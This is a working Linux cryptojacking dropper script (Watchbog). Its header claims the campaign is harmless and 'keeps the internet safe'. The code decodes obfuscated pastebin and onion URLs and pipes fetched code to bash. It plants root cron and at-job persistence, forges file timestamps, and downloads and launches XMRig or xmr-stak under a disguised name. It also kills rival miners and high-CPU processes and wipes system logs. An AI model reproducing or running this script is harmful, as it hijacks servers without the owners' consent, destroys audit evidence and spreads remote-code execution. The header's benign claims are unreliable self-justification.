#!/bin/bash
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
#This is the Old-ReBuild Lady job copy
#
#Goal:
# The goal of this campaign is as follows;
#	- To keep the internet safe.
#	- To keep them hackers from causing real damage to organisations.
#	- We know you feel We are a potential threat, well We ain't.
#	- We want to show how tiny vulns could lead to total disaters.
#	- We know you feel We are Hypocrite's, because we mine. Well if we don't how the hell we gonna let you know we are in.
#	- Please We plead to evey one out there don't sabotage this campaign (We want to keep the internet safe).
#	- Sometimes you gotta break the rules to make them.
#
#Disclaimer:
#1) We only Wanna Mine.
#2) We don't want your data, or anything or even a ransom.
#3) Please if you find this code, don't post about it.
#4) We make your security better by breaking it.
#
#Contact:
#1) If your server get's infected:
#	- We will provide cleanup script.
#	- We will share source of entry into your servers and patch (surely).
#	- Please if you contacting, please send your affected server's ip and services your run on the server.
#	- lets talk jeff4r-partner@tutanota.com or jeff4r-partner@protonmail.com
#2) If you want to partner with us ?.
#	- Well nothing to say.
#
#Note:
#1) We don't have access to Jeff4r190@tutanota.com anymore.

house=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzlRVnBkMDJpCg==|base64 -d)
room=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3QzQjRjcEM4Cg==|base64 -d)
park=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1R3dVF5YmlRCg==|base64 -d)
beam=$(echo aHR0cHM6Ly9hemlwbGNyNzJxamh6dmluLm9uaW9uLnRvL29sZC50eHQK|base64 -d)
deep=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3RUZ0xRMzVmCg==|base64 -d)
surf=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0xVTjgwSGo4Cg==|base64 -d)
me=$( whoami )

function getarch() {
	ver="x86_64"
	arch=$(uname -m)
	arch2=$(uname -i)
	arch3=$(getconf LONG_BIT)
	if [ "$arch" == "x86_64" ]; then
		ver="x86_64"
	elif [ "$arch" == "i686" ]; then
		ver="i686"
	elif [ "$arch2" == "x86_64" ]; then
		ver="x86_64"
	elif [ "$arch2" == "i386" ]; then
		ver="i686"
	elif [ "$arch3" == "64" ]; then
		ver="x86_64"
	else
		ver="x86_64"
	fi
	echo $ver
}

ARCH=$(getarch)

function system() {
	chattr -i /etc/crontab
	rm -rf /bin/httpntp /bin/ftpsdns
	sed -i '/httpntp/d' /etc/crontab
	sed -i '/ftpsdns/d' /etc/crontab
	echo -e "(python -c 'import urllib2 as fbi;print fbi.urlopen(\"$room\").read()'||curl -fsSLk $beam||wget -q -O - $beam --no-check-certificate -t 2 -T 60)|bash\n##" > /bin/httpntp
	chmod 755 /bin/httpntp
	if [ ! -f "/etc/crontab" ]; then
		echo -e "SHELL=/bin/sh\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\nHOME=/\n# run-parts\n01 * * * * root run-parts /etc/cron.hourly\n02 4 * * * root run-parts /etc/cron.daily\n0 1 * * * root /bin/httpntp\n##" >> /etc/crontab
	else
		echo -e "0 1 * * * root /bin/httpntp" >> /etc/crontab
	fi
	(curl -fsSL $room||wget -q -O - $room) > /bin/ftpsdns
	chmod 755 /bin/ftpsdns
	if [ ! -f "/etc/crontab" ]; then
		echo -e "SHELL=/bin/sh\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\nHOME=/\n# run-parts\n01 * * * * root run-parts /etc/cron.hourly\n02 4 * * * root run-parts /etc/cron.daily\n5 1 * * * root /bin/ftpsdns\n##" >> /etc/crontab
	else
		echo -e "5 1 * * * root /bin/ftpsdns" >> /etc/crontab
	fi
	touch -acmr /bin/sh /etc/crontab
}

function cronhigh() {
	chattr -i /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root
	rm -rf /etc/cron.hourly/oanacroane /etc/cron.daily/oanacroane /etc/cron.monthly/oanacroane
	mkdir -p /var/spool/cron/crontabs
	mkdir -p /etc/cron.hourly
	mkdir -p /etc/cron.daily
	mkdir -p /etc/cron.monthly
	sed -i '/pastebin.com/d' /etc/cron.d/root && sed -i '/##/d' /etc/cron.d/root
	sed -i '/pastebin.com/d' /etc/cron.d/apache && sed -i '/##/d' /etc/cron.d/apache
	sed -i '/pastebin.com/d' /etc/cron.d/system && sed -i '/##/d' /etc/cron.d/system
	sed -i '/pastebin.com/d' /var/spool/cron/crontabs/root && sed -i '/##/d' /var/spool/cron/crontabs/root
	sed -i '/pastebin.com/d' /var/spool/cron/root && sed -i '/##/d' /var/spool/cron/root
	key=$( (curl -fsSL $house||wget -q -O - $house) )
	echo -e "*/3 * * * * root (curl -fsSL $house||wget -q -O- $house||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$room\").read()'||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam -m 90||wget -q -O - $beam --no-check-certificate -t 2 -T 60)|bash\n##" >> /etc/cron.d/root
	echo -e "*/6 * * * * root (curl -fsSL $house||wget -q -O- $house||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$room\").read()'||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam -m 90||wget -q -O - $beam --no-check-certificate -t 2 -T 60)|bash\n##" >> /etc/cron.d/system
	echo -e "*/7 * * * * root (curl -fsSL $house||wget -q -O- $house||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$room\").read()'||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam -m 90||wget -q -O - $beam --no-check-certificate -t 2 -T 60)|bash\n##" >> /etc/cron.d/apache
	echo -e "*/9 * * * * (curl -fsSL $house||wget -q -O- $house||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$room\").read()'||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam -m 90||wget -q -O - $beam --no-check-certificate -t 2 -T 60)|bash\n##" >> /var/spool/cron/root
	echo -e "*/11 * * * * (curl -fsSL $house||wget -q -O- $house||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$room\").read()'||curl -fsSL $park||wget -q -O - $park||curl -fsSLk $beam -m 90||wget -q -O - $beam --no-check-certificate -t 2 -T 60)|bash\n##" >> /var/spool/cron/crontabs/root
	if [ ! -f "/etc/cron.hourly/oanacroane" ]; then
		echo $key > /etc/cron.hourly/oanacroane && chmod 755 /etc/cron.hourly/oanacroane
	fi
	if [ ! -f "/etc/cron.daily/oanacroane" ]; then
		echo $key > /etc/cron.daily/oanacroane && chmod 755 /etc/cron.daily/oanacroane
	fi
	if [ ! -f "/etc/cron.monthly/oanacroane" ]; then
		echo $key > /etc/cron.monthly/oanacroane && chmod 755 /etc/cron.monthly/oanacroane
	fi
	touch -acmr /bin/sh /var/spool/cron/root
	touch -acmr /bin/sh /var/spool/cron/crontabs/root
	touch -acmr /bin/sh /etc/cron.d/system
	touch -acmr /bin/sh /etc/cron.d/apache
	touch -acmr /bin/sh /etc/cron.d/root
	touch -acmr /bin/sh /etc/cron.hourly/oanacroane
	touch -acmr /bin/sh /etc/cron.daily/oanacroane
	touch -acmr /bin/sh /etc/cron.monthly/oanacroane
}

function cronlow() {
	cr=$(crontab -l | grep "$house" | wc -l)
	if [ ${cr} -eq 0 ];then
		crontab -r
		(crontab -l 2>/dev/null; echo "*/1 * * * * (curl -fsSL $house||wget -q -O- $house||curl -fsSL $park||wget -q -O - $park||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$room\").read()'||curl -fsSLk $beam -m 90||wget -q -O - $beam --no-check-certificate -t 2 -T 60)|bash > /dev/null 2>&1")| crontab -
	else
		echo " "
	fi
}

function cronbackup() {
	pay="(curl -fsSLk $beam -m 90||wget -q -O - $beam --no-check-certificate -t 2 -T 60||curl -fsSL $house||wget -q -O- $house)|bash"
	status=0
	crona=$(systemctl is-active cron)
	cronb=$(systemctl is-active crond)
	cronatd=$(systemctl is-active atd)
	if [ "$crona" == "active" ] ; then
		status=0
	elif [ "$cronb" == "active"  ]; then
		status=0
	elif [ "$cronatd" == "active" ] ; then
		status=1
	else
		status=2
	fi
	if [ $status -eq 1 ] ; then
		for a in $(at -l|awk '{print $1}'); do at -r $a; done
		echo "$pay" | at -m now + 1 minute
	fi
	if [ $status -eq 2 ] || [ "$me" != "root" ] ;then
		amiup=$(ps -fe|grep 'crun'|grep -v grep|wc -l)
		if [ ${amiup} -ne 0 ] ; then
			ps auxf|grep -v grep|grep "crun" | awk '{print $2}'|xargs kill -9
		fi
		key="while true; do sleep 60 && $pay; done"
		echo -e "$key\n##" > /tmp/crun && chmod 777 /tmp/crun && cd /tmp/
		nohup ./crun >/dev/null 2>&1 &
		sleep 15
		rm /tmp/crun
	fi
}

function gettarfile() {
	temp_path="/tmp/.tmpdropoff/"
	if [ "$3" == "-xzf" ];then
		tar_out="/tmp/.tmpdropoff/rig.tar.gz"
		rig_path="/tmp/.tmpdropoff/dataoutput/xmrig-2.14.1/xmrig-notls"
	else
		tar_out="/tmp/.tmpdropoff/rig.tar.xz"
		rig_path="/tmp/.tmpdropoff/dataoutput/xmr-stak-linux-2.10.3-cpu/xmr-stak"
	fi
	mkdir -p $temp_path/dataoutput/
	cd $temp_path
	(curl -fsSL $2 -o $tar_out||wget -q $2 -O $tar_out)
	tar $3 $tar_out -C $temp_path/dataoutput/
	mv $rig_path $4
	cd $1
	rm -rf $temp_path
}

function getencodedfile() {
	(curl -fsSL $1|| wget -q -O - $1)| base64 -d > $2
}

function download() {
	pa=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
	if [ ${pa} -eq 0 ];then
		mi_64=$(echo aHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnL3JlbGVhc2VzL2Rvd25sb2FkL3YyLjE0LjEveG1yaWctMi4xNC4xLXhlbmlhbC14NjQudGFyLmd6Cg==|base64 -d)
		mi_32=$(echo aHR0cHM6Ly9waXhlbGRyYWluLmNvbS9hcGkvZmlsZS9adVZXY2VXRw==|base64 -d)
		der_ke=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2RYRDJCczBICg==|base64 -d)
		if [ "$me" != "root" ]; then
			path="/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data"
			if [ -d "$path" ]; then
				rm -rf $path/*
			else
				mkdir -p $path
			fi
		else
			path="/bin"
			rm -rf $path/config.json $path/watchbog
		fi
		cd $path
		if [ ! -f "$path/config.json" ]; then
			getencodedfile "$der_ke" "$path/config.json"
		fi
		if [ "$ARCH" == "x86_64" ]; then
			if [ ! -f "$path/watchbog" ]; then
				gettarfile "$path" "$mi_64" "-xzf" "$path/watchbog"
				chmod 777 $path/watchbog
				nohup ./watchbog >/dev/null 2>&1 &
			else
				nohup ./watchbog >/dev/null 2>&1 &
			fi
		elif [ "$ARCH" == "i686" ]; then
			# if [ ! -f "$path/watchbog" ]; then
				# getencodedfile "$mi_32" "$path/watchbog"
				# chmod 777 $path/watchbog
				# nohup ./watchbog >/dev/null 2>&1 &
			# else
				# nohup ./watchbog >/dev/null 2>&1 &
			# fi
			echo ""
		else
			if [ ! -f "$path/watchbog" ]; then
				gettarfile "$path" "$mi_64" "-xzf" "$path/watchbog"
				chmod 777 $path/watchbog
				nohup ./watchbog >/dev/null 2>&1 &
			else
				nohup ./watchbog >/dev/null 2>&1 &
			fi
		fi
	fi
}

function testa() {
	pb=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
	if [ ${pb} -eq 0 ];then
		st_64=$(echo aHR0cHM6Ly9naXRodWIuY29tL2ZpcmVpY2UtdWsveG1yLXN0YWsvcmVsZWFzZXMvZG93bmxvYWQvMi4xMC4zL3htci1zdGFrLWxpbnV4LTIuMTAuMy1jcHUudGFyLnh6Cg==|base64 -d)
		con_url=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1prejBkOUp6Cg==|base64 -d)
		cpu_url=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L212U0VHbVI2Cg==|base64 -d)
		poo_url=$(echo aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1NCMFRZQnZHCg==|base64 -d)
		if [ "$me" != "root" ]; then
			path="/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data"
			if [ -d "$path" ]; then
				rm -rf $path/*
			else
				mkdir -p $path
			fi
		else
			path="/bin"
			rm -rf $path/config.json $path/watchbog $path/config.txt $path/cpu.txt $path/pools.txt
		fi
		cd $path
		if [ ! -f "$path/config.txt" ]; then
			getencodedfile "$con_url" "$path/config.txt"
			chmod 777 $path/config.txt
		fi
		if [ ! -f "$path/cpu.txt" ]; then
			getencodedfile "$cpu_url" "$path/cpu.txt"
			chmod 777 $path/cpu.txt
		fi
		if [ ! -f "$path/pools.txt" ]; then
			getencodedfile "$poo_url" "$path/pools.txt"
			chmod 777 $path/pools.txt
		fi
		if [ "$ARCH" == "x86_64" ]; then
			if [ ! -f "$path/watchbog" ]; then
				gettarfile "$path" "$st_64" "-xf" "$path/watchbog"
				chmod 777 $path/watchbog
				nohup ./watchbog >/dev/null 2>&1 &
			else
				nohup ./watchbog >/dev/null 2>&1 &
			fi
		else
			rm -rf $path/cpu.txt $path/pools.txt $path/config.txt
		fi
	fi
}

function finished() {
	(curl -fsSL $1 || wget -q -O - $1) && touch /tmp/.tmpc
}

function cleanoldpack() {
	pkill -f watchbog
	ps aux | grep -v '/boot/vmlinuz' | awk '{if($3>30.0) print $2}' | while read procid; do kill -9 $procid; done
	ps auxf|grep -v grep|grep "watchbog" | awk '{print $2}'|xargs kill -9
	netstat -anp | grep "watchbog" |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -antp | grep '27.155.87.59\|51.38.133.232' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
	netstat -antp | grep '27.155.87.59\|51.38.133.232' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
	netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13\|51.38.133.232' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
	netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13\|51.38.133.232' | grep 'CLOSE_WAIT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
	netstat -antp | grep '104.160.171.94\|170.178.178.57\|91.236.182.1\|52.15.72.79\|52.15.62.13\|51.38.133.232' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
	netstat -antp | grep '121.18.238.56\|51.38.133.232' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
	netstat -antp | grep '121.18.238.56\|51.38.133.232' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
	netstat -antp | grep '103.99.115.220\|51.38.133.232' | grep 'SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
	netstat -antp | grep '103.99.115.220\|51.38.133.232' | grep 'ESTABLISHED' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
	pkill -f /usr/bin/.sshd
	netstat -antp | grep '202.144.193.110:3333\|51.38.133.232'  | awk '{print $7}' | sed -e "s/\/.*//g" | xargs kill -9
	pkill -f sourplum
	pkill wnTKYg && pkill ddg* && rm -rf /tmp/ddg* && rm -rf /tmp/wnTKYg
	rm -rf /tmp/qW3xT.2 /tmp/ddgs.3013 /tmp/ddgs.3012 /tmp/wnTKYg /tmp/2t3ik
	rm -rf /boot/grub/deamon && rm -rf /boot/grub/disk_genius
	rm -rf /tmp/*index_bak*
	rm -rf /tmp/*httpd.conf*
	rm -rf /tmp/*httpd.conf
	rm -rf /tmp/a7b104c270
	ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmrig" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmrigDaemon" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmrigMiner" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "/var/tmp/java" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "/var/tmp/sustes" | awk '{print $2}'|xargs kill -9
	pkill -f biosetjenkins
	pkill -f AnXqV.yam
	pkill -f xmrigDaemon
	pkill -f xmrigMiner
	pkill -f xmrig
	pkill -f Loopback
	pkill -f apaceha
	pkill -f cryptonight
	pkill -f stratum
	pkill -f mixnerdx
	pkill -f performedl
	pkill -f JnKihGjn
	pkill -f irqba2anc1
	pkill -f irqba5xnc1
	pkill -f irqbnc1
	pkill -f ir29xc1
	pkill -f conns
	pkill -f irqbalance
	pkill -f crypto-pool
	pkill -f minexmr
	pkill -f XJnRj
	pkill -f NXLAi
	pkill -f BI5zj
	pkill -f askdljlqw
	pkill -f minerd
	pkill -f minergate
	pkill -f Guard.sh
	pkill -f ysaydh
	pkill -f bonns
	pkill -f donns
	pkill -f kxjd
	pkill -f Duck.sh
	pkill -f bonn.sh
	pkill -f conn.sh
	pkill -f kworker34
	pkill -f kw.sh
	pkill -f pro.sh
	pkill -f polkitd
	pkill -f acpid
	pkill -f icb5o
	pkill -f nopxi
	pkill -f irqbalanc1
	pkill -f minerd
	pkill -f i586
	pkill -f gddr
	pkill -f mstxmr
	pkill -f ddg.2011
	pkill -f wnTKYg
	pkill -f deamon
	pkill -f disk_genius
	pkill -f sourplum
	pkill -f bashx
	pkill -f bashg
	pkill -f bashe
	pkill -f bashf
	pkill -f bashh
	pkill -f XbashY
	pkill -f libapache
	pkill -f qW3xT.2
	pkill -f /usr/bin/.sshd
	pkill -f sustes
	rm -rf /var/tmp/j*
	rm -rf /tmp/j*
	rm -rf /var/tmp/java
	rm -rf /tmp/java
	rm -rf /var/tmp/java2
	rm -rf /tmp/java2
	rm -rf /var/tmp/java*
	rm -rf /tmp/java*
	rm -rf /tmp/httpd.conf
	rm -rf /tmp/conn
	rm -rf /tmp/root.sh /tmp/pools.txt /tmp/libapache /tmp/config.json /tmp/bashf /tmp/bashg /tmp/libapache
	rm -rf /tmp/conns
	rm -f /tmp/irq.sh
	rm -f /tmp/irqbalanc1
	rm -f /tmp/irq
	rm -rf /tmp/kworkerds /bin/kworkerds /bin/config.json /var/tmp/kworkerds /var/tmp/config.json /usr/local/lib/libjdk.so
	rm -rf /tmp/.systemd-private-*
	netstat -anp | grep 69.28.55.86:443 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep 185.71.65.238 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep 140.82.52.87 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :3333 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :4444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :5555 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :6666 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :7777 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :3347 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :14444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :14433 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
	netstat -anp | grep :1351 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
}

if [ ! -f "/tmp/.jqwwwwwww3433" ]; then
	rm /tmp/.jqwwwwwww*
	touch /tmp/.jqwwwwwww3433
	cleanoldpack
fi
if [ "$me" != "root" ];then
	pz=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
	if [ ${pz} -ne 0 ];then
		crontab -r
		cronlow
	else
		download
		crontab -r
		cronlow
		sleep 15
		pm=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
		if [ ${pm} -eq 0 ];then
			testa
		fi
		prt=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
		if [ ${prt} -ne 0 ];then
			if [ ! -f "/tmp/.tmpc" ]; then
				finished "$deep"
			fi
		fi
	fi
else
	pz=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
	if [ ${pz} -ne 0 ];then
		system
		cronhigh
	else
		system
		cronhigh
		download
		sleep 15
		pm=$(ps -fe|grep 'watchbog'|grep -v grep|wc -l)
		if [ ${pm} -ne 0 ];then
			if [ ! -f "/tmp/.tmpc" ]; then
				finished "$surf"
			fi
		fi
		sleep 30
		if [ ${pm} -eq 0 ];then
			testa
			if [ ${pm} -ne 0 ];then
				finished "$surf"
			fi
		fi
		if [ ${pm} -eq 0 ];then
			download
			if [ ${pm} -ne 0 ];then
				finished "$deep"
			fi
		fi
		if [ ${pm} -eq 0 ];then
			testa
			if [ ${pm} -ne 0 ];then
				finished "$deep"
			fi
		fi
	fi
	echo 0>/var/log/secure
	echo 0>/var/log/cron
	sed -i '/pastebin/d' /var/log/syslog
	sed -i '/github/d' /var/log/syslog
fi
#
cronbackup
#
if [ -f "/tmp/.tmpZOQSQzqknw1231AS2112sqsQQQQ" ]; then
	rm /tmp/.tmpZOQSQzqknw1231AS2112sqsQQQQ
fi
#
